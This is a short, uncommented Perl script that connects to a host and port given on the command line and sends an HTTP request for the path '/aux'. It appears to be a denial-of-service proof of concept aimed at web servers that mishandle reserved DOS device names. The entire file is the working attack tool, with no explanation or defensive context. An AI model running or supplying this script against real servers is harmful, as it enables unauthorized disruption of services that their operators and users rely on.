#!/usr/bin/perl
use IO::Socket;
if (@ARGV < 1 || @ARGV > 2) {
	print STDOUT "Usage: perl $0 <host> <port=80>";
	exit;
}
if (@ARGV == 2) {
	$port = $ARGV[1];
} else {
	$port = 80;
}
$f = IO::Socket::INET->new(Proto=>"tcp", PeerHost=>$ARGV[0], 
PeerPort=>$port);
print $f "GET /aux HTTP/1.0\r\n\r\n";